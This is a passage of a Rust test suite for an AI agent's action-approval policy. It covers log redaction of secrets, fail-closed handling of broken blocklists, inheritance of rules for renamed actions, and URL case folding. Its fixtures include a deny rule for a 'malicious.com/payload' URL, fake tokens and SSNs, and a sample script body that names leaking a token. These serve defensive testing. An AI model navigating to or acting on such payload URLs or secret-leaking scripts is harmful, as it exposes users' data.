            self.pairs
                .push((field.name().to_string(), value.to_string()));
        }
        fn record_i64(&mut self, field: &tracing::field::Field, value: i64) {
            self.pairs
                .push((field.name().to_string(), value.to_string()));
        }
        fn record_u64(&mut self, field: &tracing::field::Field, value: u64) {
            self.pairs
                .push((field.name().to_string(), value.to_string()));
        }
        fn record_bool(&mut self, field: &tracing::field::Field, value: bool) {
            self.pairs
                .push((field.name().to_string(), value.to_string()));
        }
    }

    struct CaptureLayer {
        events: Arc<Mutex<Vec<Vec<(String, String)>>>>,
    }

    impl<S> Layer<S> for CaptureLayer
    where
        S: Subscriber + for<'a> LookupSpan<'a>,
    {
        fn on_event(&self, event: &Event<'_>, _ctx: Context<'_, S>) {
            let mut v = CapturedFields::default();
            event.record(&mut v);
            self.events.lock().unwrap().push(v.pairs);
        }
    }

    fn captured_runs() -> Arc<Mutex<Vec<Vec<(String, String)>>>> {
        Arc::new(Mutex::new(Vec::new()))
    }

    fn make_request_with_target(action_type: ActionType, target: &str) -> ActionRequest {
        ActionRequest {
            action_type,
            target: target.to_string(),
            display_target: String::new(),
            agent_id: "audit-test".to_string(),
            context: "audit-test".to_string(),
            timestamp: Utc::now(),
        }
    }

    fn policy_blocking_secret(action: ActionType, secret: &str) -> ConfigApprovalPolicy {
        use std::collections::HashMap;
        let pattern = format!("*{secret}*");
        ConfigApprovalPolicy::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![],
            blocklist: vec![PolicyRule {
                action_type: action,
                pattern,
            }],
        })
    }

    fn target_field(fields: &[(String, String)]) -> Option<&str> {
        for (k, v) in fields {
            if k == "target" {
                return Some(v.as_str());
            }
        }
        None
    }

    /// Every captured field value of one log event, joined — the event as the
    /// subscriber saw it, without the field names.
    fn all_field_values(fields: &[(String, String)]) -> String {
        fields
            .iter()
            .map(|(_, value)| value.as_str())
            .collect::<Vec<_>>()
            .join(" ")
    }

    #[tokio::test]
    async fn check_log_redacts_clipboard_text() {
        let secret_clipboard = "TOP_SECRET_TOKEN_ABCDEF-12345";
        let req = make_request_with_target(ActionType::DesktopType, secret_clipboard);
        let policy = policy_blocking_secret(ActionType::DesktopType, secret_clipboard);

        let sink = captured_runs();
        let layer = CaptureLayer {
            events: Arc::clone(&sink),
        };
        let _guard = tracing_subscriber::registry()
            .with(EnvFilter::new("debug"))
            .with(layer)
            .set_default();

        let _ = policy.check(&req).await;

        drop(_guard);
        let captured = sink.lock().unwrap();
        assert!(!captured.is_empty(), "expected a debug log from check()");
        for fields in captured.iter() {
            let target_value = target_field(fields).unwrap_or("");
            assert!(
                !target_value.contains(secret_clipboard),
                "target field must not contain raw clipboard text, got: {target_value}"
            );
        }
    }

    #[tokio::test]
    async fn record_log_redacts_pim_body() {
        let secret_pim_body = "PATIENT_SSN_999-88-7777";
        let req = make_request_with_target(ActionType::PimWrite, secret_pim_body);
        let policy = ConfigApprovalPolicy::default();

        let sink = captured_runs();
        let layer = CaptureLayer {
            events: Arc::clone(&sink),
        };
        let _guard = tracing_subscriber::registry()
            .with(EnvFilter::new("debug"))
            .with(layer)
            .set_default();

        policy.record(&req, &ApprovalDecision::Allow).await;

        drop(_guard);
        let captured = sink.lock().unwrap();
        assert!(!captured.is_empty(), "expected an info log from record()");
        for fields in captured.iter() {
            let target_value = target_field(fields).unwrap_or("");
            assert!(
                !target_value.contains(secret_pim_body),
                "target field must not contain raw PIM body, got: {target_value}"
            );
        }
    }

    #[tokio::test]
    async fn check_log_redacts_script_body() {
        let secret_script = "echo LEAK_THIS_TOKEN_NOW";
        let req = make_request_with_target(ActionType::DesktopAutomation, secret_script);
        let policy = policy_blocking_secret(ActionType::DesktopAutomation, secret_script);

        let sink = captured_runs();
        let layer = CaptureLayer {
            events: Arc::clone(&sink),
        };
        let _guard = tracing_subscriber::registry()
            .with(EnvFilter::new("debug"))
            .with(layer)
            .set_default();

        let _ = policy.check(&req).await;

        drop(_guard);
        let captured = sink.lock().unwrap();
        for fields in captured.iter() {
            let target_value = target_field(fields).unwrap_or("");
            assert!(
                !target_value.contains(secret_script),
                "target field must not contain raw script body, got: {target_value}"
            );
        }
    }

    // -----------------------------------------------------------------------
    // Fallback-by-cause: absent file vs. broken file
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn missing_policy_file_yields_the_curated_defaults_not_all_ask() {
        // Nothing in this repo ever writes `approval-policy.json`, so "absent"
        // is the shipped state of every install. Falling back to an empty
        // defaults map here turned every approval-gated tool into a refusal
        // string with no in-product way to resolve it.
        let dir = tempfile::tempdir().expect("tempdir");
        let policy = ConfigApprovalPolicy::load_from(dir.path().join("nope.json"));

        let req = make_request_with_target(ActionType::BrowserNavigate, "https://example.com");
        assert_eq!(
            policy.check(&req).await,
            ApprovalDecision::Allow,
            "an install with no policy file must be able to navigate the browser"
        );
    }

    #[tokio::test]
    async fn corrupt_policy_file_still_falls_back_to_all_ask() {
        // The half that must never loosen: a policy the operator wrote but that
        // no longer parses cannot silently resolve to something weaker.
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("approval-policy.json");
        std::fs::write(&path, "{ this is not json").expect("write corrupt policy");
        let policy = ConfigApprovalPolicy::load_from(path);

        let req = make_request_with_target(ActionType::BrowserNavigate, "https://example.com");
        assert!(
            matches!(policy.check(&req).await, ApprovalDecision::Ask { .. }),
            "a broken policy file must escalate everything to Ask"
        );
    }

    #[tokio::test]
    async fn the_curated_default_map_is_reachable_from_load() {
        // Pins the file-absent path to `Default::default()` so the curated map
        // cannot drift back into being an unreachable, test-only artifact.
        let dir = tempfile::tempdir().expect("tempdir");
        let loaded = ConfigApprovalPolicy::load_from(dir.path().join("nope.json"));
        let curated = ConfigApprovalPolicy::default();

        for (action, expected) in [
            (ActionType::BrowserOpen, DefaultDecision::Ask),
            (ActionType::BrowserNavigate, DefaultDecision::Allow),
            (ActionType::BrowserEvaluate, DefaultDecision::Ask),
        ] {
            let req = make_request_with_target(action.clone(), "https://example.com");
            let from_load = loaded.check(&req).await;
            assert_eq!(
                from_load,
                curated.check(&req).await,
                "{action} must resolve identically through load_from(missing) and Default::default()"
            );
            let matches_expectation = match expected {
                DefaultDecision::Allow => matches!(from_load, ApprovalDecision::Allow),
                DefaultDecision::Ask => matches!(from_load, ApprovalDecision::Ask { .. }),
                DefaultDecision::Deny => matches!(from_load, ApprovalDecision::Deny { .. }),
            };
            assert!(
                matches_expectation,
                "{action} resolved to {from_load:?}, expected {expected:?}"
            );
        }
    }

    /// Drift guard for the curated default map: every `ActionType` variant
    /// must be explicitly named in [`ConfigApprovalPolicy::default`]. An
    /// unnamed variant falls through to `Ask` (the safe "no policy" default),
    /// which silently weakens the curated posture if a new variant joins the
    /// enum without an entry here. The exhaustive list below is the half of
    /// the guard that catches additions (a new variant fails to compile
    /// until it joins the list and the default() map in lockstep); the
    /// membership check on the internal map catches the other half (an
    /// entry removed from default() silently weakens the posture).
    #[test]
    fn curated_default_covers_every_action_type() {
        let curated = ConfigApprovalPolicy::default();
        // `ActionType::ALL`, not a second hand-written list of the same
        // variants. The failure message below says "a new ActionType variant
        // joined the enum without an entry here" — which a typed list only
        // catches if somebody also remembers to extend the list, i.e. it
        // catches nothing (判据 §5). The enum's own declaration emits this one.
        //
        // Same floor as its twin `inheritance_is_one_level_and_acyclic`: a
        // derivation that silently emitted an empty array would make the loop
        // below unfalsifiable, and "0 variants all have an entry" is 判据 §2's
        // 恒绿. One of a pair deriving and the other not is 判据 §16, so the
        // twin gets the guard rather than waiting to be rediscovered there.
        assert!(
            ActionType::ALL.len() > 20,
            "ActionType::ALL has {} entries — the derivation, not the enum, is \
             what broke",
            ActionType::ALL.len()
        );
        for action in ActionType::ALL {
            // Probe the internal map directly: an omitted variant would
            // resolve to Ask via `check`'s step 4 (no default) — the same
            // answer an intentional "ask on sight" entry would give, so
            // membership is the only signal that catches a removal.
            assert!(
                curated.config.defaults.contains_key(&action),
                "{action:?} is missing from the curated default() map — a new \
                 ActionType variant joined the enum without an entry here, \
                 which silently weakens the curated posture (the missing \
                 variant falls through to Ask, which may differ from the \
                 posture the operator expected)."
            );
        }
        // Presence is all the loop above can see, and a presence-only census
        // is 判据 §2's 恒真的谓词 for a VALUE change: flipping this entry to
        // `Allow` leaves the key exactly where it was. The switch launches a
        // browser and copies every cookie into it, so it must never be looser
        // than `browser_open`, whose own entry is `Ask`.
        assert_eq!(
            curated
                .config
                .defaults
                .get(&ActionType::BrowserSwitchEngine),
            Some(&DefaultDecision::Ask),
            "the switch must not be looser than browser_open"
        );
    }

    /// Splitting an `ActionType` in two must not loosen a policy file written
    /// against the old name.
    ///
    /// A policy file replaces the curated defaults wholesale, so an operator
    /// whose file says `browser_cookies_write: deny` — and who was thereby
    /// denying header injection and storage-state moves, because those WERE
    /// that action — must keep denying them after the rename, without editing
    /// anything.
    #[tokio::test]
    async fn a_renamed_action_inherits_the_old_key_rather_than_falling_through_to_ask() {
        let mut defaults = HashMap::new();
        defaults.insert(ActionType::BrowserCookiesWrite, DefaultDecision::Deny);
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults,
            allowlist: vec![],
            blocklist: vec![],
        });

        for split_out in [
            ActionType::BrowserIdentityOverride,
            ActionType::BrowserSessionState,
        ] {
            let req = make_request_with_target(split_out.clone(), "x");
            assert!(
                matches!(policy.check(&req).await, ApprovalDecision::Deny { .. }),
                "{split_out} must inherit the deny the operator wrote for its old name"
            );
        }
    }

    /// …and the inheritance is a fallback, not an override: naming the new key
    /// explicitly wins, which is what makes the split worth having.
    #[tokio::test]
    async fn an_explicit_entry_for_the_new_key_beats_the_inherited_one() {
        let mut defaults = HashMap::new();
        defaults.insert(ActionType::BrowserCookiesWrite, DefaultDecision::Deny);
        defaults.insert(ActionType::BrowserIdentityOverride, DefaultDecision::Allow);
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults,
            allowlist: vec![],
            blocklist: vec![],
        });

        let allowed = make_request_with_target(ActionType::BrowserIdentityOverride, "x");
        assert!(matches!(
            policy.check(&allowed).await,
            ApprovalDecision::Allow
        ));
        // The sibling that was NOT named still inherits.
        let inherited = make_request_with_target(ActionType::BrowserSessionState, "x");
        assert!(matches!(
            policy.check(&inherited).await,
            ApprovalDecision::Deny { .. }
        ));
    }

    /// The chain must stay one level deep and acyclic — it exists to preserve
    /// a rename, not to grow a taxonomy that could loop in `check`.
    /// Walks `ActionType::ALL`, which the enum's own declaration emits.
    ///
    /// It used to walk a hand-written six-entry list, and `BrowserSwitchEngine`
    /// then joined the enum as a NEW inheriting variant that the only guard on
    /// the inheritance promise could not see — 判据 §5, a list covering the
    /// world as it was on the day it was typed.
    #[test]
    fn inheritance_is_one_level_and_acyclic() {
        // A floor on the derivation itself: an `ALL` that silently emitted an
        // empty array would make every assertion below unfalsifiable (判据 §2).
        assert!(
            ActionType::ALL.len() > 20,
            "ActionType::ALL has {} entries — the derivation, not the enum, is \
             what broke",
            ActionType::ALL.len()
        );
        let mut inheritors = 0;
        for action in ActionType::ALL {
            if let Some(parent) = action.inherited_from() {
                inheritors += 1;
                assert_ne!(parent, action, "{action} inherits from itself");
                assert_eq!(
                    parent.inherited_from(),
                    None,
                    "{action} -> {parent} is more than one level deep"
                );
            }
        }
        // And the walk actually reaches inheriting variants. Without this the
        // loop is satisfied by an `inherited_from` that answered `None` for
        // everything — 判据 §2's 恒绿 face, and the shape that would have hidden
        // the missing variant just as well as the short list did.
        assert!(
            inheritors >= 3,
            "only {inheritors} variants inherit; the promise `ActionType`'s doc \
             makes is no longer being exercised"
        );
    }

    // -----------------------------------------------------------------------
    // Fail-closed blocklist compile failure (APPROVAL-R*-001)
    // -----------------------------------------------------------------------

    /// A blocklist rule that fails to compile (operator typo, size bomb,
    /// ReDoS-shaped pattern) must NOT silently fall through to the
    /// default-Allow posture of `BrowserNavigate`. Fail-closed semantics
    /// deny every target of that action type.
    ///
    /// Uses a 2 MB literal pattern — exceeds
    /// `crate::security::safe_regex::MAX_COMPILED_SIZE` (1 MiB) so
    /// `bounded_builder` rejects the compile deterministically.
    #[tokio::test]
    async fn a_blocklist_rule_that_fails_to_compile_denies_all_matching_actions() {
        let oversized_pattern = "a".repeat(2_000_000);
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![],
            blocklist: vec![PolicyRule {
                action_type: ActionType::BrowserNavigate,
                pattern: oversized_pattern,
            }],
        });
        let req = make_request_with_target(
            ActionType::BrowserNavigate,
            "https://docs.github.com/en/actions",
        );
        assert!(
            matches!(policy.check(&req).await, ApprovalDecision::Deny { .. }),
            "a broken blocklist must deny all matching actions, not silently fall through to defaults"
        );
    }

    /// The fail-closed half's mirror: an allowlist compile failure stays
    /// fail-open (the rule is dropped, defaults remain). A broken allowlist
    /// for a default-Allow action type means no tightening was lost — the
    /// rule was a convenience, not a permission.
    #[tokio::test]
    async fn an_allowlist_rule_that_fails_to_compile_is_silently_skipped() {
        let oversized_pattern = "a".repeat(2_000_000);
        let mut defaults = HashMap::new();
        defaults.insert(ActionType::BrowserNavigate, DefaultDecision::Allow);
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults,
            allowlist: vec![PolicyRule {
                action_type: ActionType::BrowserNavigate,
                pattern: oversized_pattern,
            }],
            blocklist: vec![],
        });
        let req = make_request_with_target(
            ActionType::BrowserNavigate,
            "https://docs.github.com/en/actions",
        );
        assert!(
            matches!(policy.check(&req).await, ApprovalDecision::Allow),
            "a broken allowlist rule is dropped; the default posture is preserved"
        );
    }

    // -----------------------------------------------------------------------
    // Rename inheritance in the RULE lists (B1-03 / B2-001)
    // -----------------------------------------------------------------------

    /// A rule written for the OLD name of an action still applies to the
    /// action's new names.
    ///
    /// The defaults map already inherited; the blocklist and the allowlist did
    /// not, which turned every rename into a hole: an operator who denied
    /// `browser_cookies_write` was silently permitting
    /// `browser_identity_override` and `browser_session_state`.
    #[tokio::test]
    async fn a_renamed_action_inherits_the_blocklist_rule_written_for_the_old_name() {
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![],
            blocklist: vec![PolicyRule {
                action_type: ActionType::BrowserCookiesWrite,
                pattern: "*secret*".to_string(),
            }],
        });

        for split_out in [
            ActionType::BrowserIdentityOverride,
            ActionType::BrowserSessionState,
        ] {
            let req = make_request_with_target(split_out.clone(), "the-secret-cookie");
            assert!(
                matches!(policy.check(&req).await, ApprovalDecision::Deny { .. }),
                "{split_out} must inherit the blocklist rule written for BrowserCookiesWrite"
            );
        }
    }

    /// …and the same inheritance applies to the ALLOWLIST: a rule written for
    /// the old name still permits the new ones.
    #[tokio::test]
    async fn a_renamed_action_inherits_the_allowlist_rule_written_for_the_old_name() {
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![PolicyRule {
                action_type: ActionType::BrowserCookiesWrite,
                pattern: "*allowed*".to_string(),
            }],
            blocklist: vec![],
        });

        let req = make_request_with_target(ActionType::BrowserIdentityOverride, "allowed-target");
        assert_eq!(
            policy.check(&req).await,
            ApprovalDecision::Allow,
            "an allowlist rule written for the old name must apply to the new names"
        );
    }

    /// Naming the new action explicitly must not DISCARD the parent's
    /// blocklist rule. The blocklist is consulted first and covers both
    /// names, so an explicit allowlist entry for the child cannot buy its way
    /// past a deny the operator wrote for the whole family.
    #[tokio::test]
    async fn an_explicit_child_allowlist_cannot_discard_an_inherited_blocklist_rule() {
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![PolicyRule {
                action_type: ActionType::BrowserIdentityOverride,
                pattern: "*cookie*".to_string(),
            }],
            blocklist: vec![PolicyRule {
                action_type: ActionType::BrowserCookiesWrite,
                pattern: "*cookie*".to_string(),
            }],
        });

        let req = make_request_with_target(ActionType::BrowserIdentityOverride, "cookie-jar");
        assert!(
            matches!(policy.check(&req).await, ApprovalDecision::Deny { .. }),
            "the inherited blocklist rule outranks an explicit allowlist entry for the child"
        );
    }

    // -----------------------------------------------------------------------
    // URL scheme / host case folding (B2-006)
    // -----------------------------------------------------------------------

    /// A URL's scheme and host are case-insensitive; a glob rule is matched
    /// literally. Without folding, `HTTPS://MALICIOUS.COM/payload` slips
    /// past a rule written as `*://malicious.com/*`.
    #[tokio::test]
    async fn a_mixed_case_url_scheme_and_host_still_hit_the_blocklist_rule() {
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![],
            blocklist: vec![PolicyRule {
                action_type: ActionType::BrowserNavigate,
                pattern: "*://malicious.com/*".to_string(),
            }],
        });

        for target in [
            "https://malicious.com/payload",
            "HTTPS://MALICIOUS.COM/payload",
            "HtTpS://Malicious.Com/payload",
        ] {
            let req = make_request_with_target(ActionType::BrowserNavigate, target);
            assert!(
                matches!(policy.check(&req).await, ApprovalDecision::Deny { .. }),
                "{target} must hit the blocklist rule written for the lower-case host"
            );
        }
    }

    /// …but the PATH stays case-sensitive: folding it would turn a rule about
    /// one path into a rule about every spelling of it.
    #[tokio::test]
    async fn the_url_path_stays_case_sensitive() {
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![],
            blocklist: vec![PolicyRule {
                action_type: ActionType::BrowserNavigate,
                pattern: "https://example.com/Secret*".to_string(),
            }],
        });

        let req = make_request_with_target(
            ActionType::BrowserNavigate,
            "https://example.com/secret-path",
        );
        assert!(
            !matches!(policy.check(&req).await, ApprovalDecision::Deny { .. }),
            "the path is a case-sensitive part of a URL and must not be folded"
        );
    }

    // -----------------------------------------------------------------------
    // Log hygiene (B2-003) and bounded policy file (B2-005)
    // -----------------------------------------------------------------------

    /// A rule pattern is operator-authored and may embed a secret (a token in
    /// a URL, a private path). It reaches the log only in redacted form —
    /// including through the deny reason, which carries the pattern.
    #[tokio::test]
    async fn a_rule_pattern_never_reaches_the_log_in_the_clear() {
        let secret_pattern = "https://internal.example.com/TOKEN-abc123";
        let req = make_request_with_target(ActionType::BrowserNavigate, secret_pattern);
        let policy = ConfigApprovalPolicy::new(PolicyConfig {
            defaults: HashMap::new(),
            allowlist: vec![],
            blocklist: vec![PolicyRule {
                action_type: ActionType::BrowserNavigate,
                pattern: secret_pattern.to_string(),
            }],
        });

        let sink = captured_runs();
        let layer = CaptureLayer {
            events: Arc::clone(&sink),
        };
        let _guard = tracing_subscriber::registry()
            .with(EnvFilter::new("debug"))
            .with(layer)
            .set_default();

        let decision = policy.check(&req).await;
        // The caller records the FINAL decision — for a denial that reason
        // carries the rule pattern.
        policy.record(&req, &decision).await;

        drop(_guard);
        let captured = sink.lock().unwrap();
        assert!(!captured.is_empty(), "expected log events from check()/record()");
        for fields in captured.iter() {
            let values = all_field_values(fields);
            assert!(
                !values.contains(secret_pattern),
                "the rule pattern must not appear in the log, got: {values}"
            );
        }
    }

    /// A policy file is a small JSON document written by a human. An
    /// oversized one is not read — it would be pulled into memory on the
    /// approval path — and falls back to the safe posture.
    #[tokio::test]
    async fn an_oversized_policy_file_falls_back_to_the_safe_posture() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("approval-policy.json");
        std::fs::write(&path, "x".repeat((MAX_POLICY_FILE_BYTES + 1) as usize))
            .expect("write oversized policy");

        let policy = ConfigApprovalPolicy::load_from(path);
        let req = make_request_with_target(ActionType::BrowserNavigate, "https://example.com");
        assert!(
            matches!(policy.check(&req).await, ApprovalDecision::Ask { .. }),
            "a policy file over the size limit must not be read; the safe posture applies"
        );
    }
}
